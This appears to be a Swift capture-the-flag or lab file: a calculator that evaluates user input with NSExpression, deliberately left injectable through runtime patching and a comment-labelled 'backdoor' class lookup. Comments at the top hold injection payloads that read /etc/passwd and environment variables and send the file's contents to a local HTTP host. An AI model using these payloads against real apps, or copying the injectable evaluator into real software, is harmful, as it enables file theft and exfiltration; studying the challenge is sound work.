
import Foundation
import Darwin


// FUNCTION(FUNCTION(FUNCTION('A', 'superclass'), 'alloc'), 'initWithContentsOfFile:', '/etc/passwd')

// FUNCTION(FUNCTION(CAST('NSProcessInfo', 'Class'), 'processInfo'), 'environment').TMPDIR

//FUNCTION(FUNCTION(FUNCTION('A', 'superclass'), 'alloc'), 'initWithContentsOfURL:', FUNCTION(CAST('NSURL', 'Class'), 'URLWithString:', FUNCTION('http://127.0.0.1:1024/?aa=', 'stringByAppendingString:', FUNCTION(FUNCTION(FUNCTION(FUNCTION('A', 'superclass'), 'alloc'), 'initWithContentsOfFile:', '/etc/passwd'), 'stringByAddingPercentEncodingWithAllowedCharacters:', FUNCTION(CAST('NSCharacterSet', 'Class'), 'URLQueryAllowedCharacterSet')))))


// backdoor, in case you didn't find the CAST() operator

extension NSString {
    @objc
    func forName() -> AnyClass? {
        return NSClassFromString(self as String)
    }
}


public final class Calculator {
    static let shared = Calculator()

    private let constants: NSMutableDictionary

    private init() {
        self.constants = [:]

        connect()
        prepare()
    }

    private func prepare() {
        let predefined : NSMutableDictionary = [
            "pi": Double.pi,
            "e": Darwin.M_E,
        ]

        for (key, value) in predefined {
            self.constants[key] = value
            self.constants[(key as! String).uppercased()] = value
        }
    }

    // monkey patch to add mathmatic functions
    private func connect() {
        let className = "_NSPredicateUtilities"
        if let clazz = (className as NSString).forName() {
            let meta : AnyClass = (objc_getMetaClass(className) as! AnyClass)
            var count : UInt32 = 0
            if let methods = class_copyMethodList(Math.self, &count) {
                for index in 0..<numericCast(count) {
                    let method : Method = methods[index]
                    let selector : Selector = method_getName(method)

                    let str = String(cString: sel_getName(selector))
                    let demangled = Selector(str.replacingOccurrences(of: "WithX", with: ""))

                    let encoding = method_getTypeEncoding(method)
                    let imp = method_getImplementation(method)
                    class_addMethod(clazz, demangled, imp, encoding)
                    class_addMethod(meta, demangled, imp, encoding)
                }
            }
        }
    }

    public func evaluate(input: String) -> String {
        let mathExpression = NSExpression(format: input)
        if let value = mathExpression.expressionValue(with:constants, context: nil) {
            return "= " + String(describing: value)
        } else {
            return "(invalid expression)"
        }
    }
}
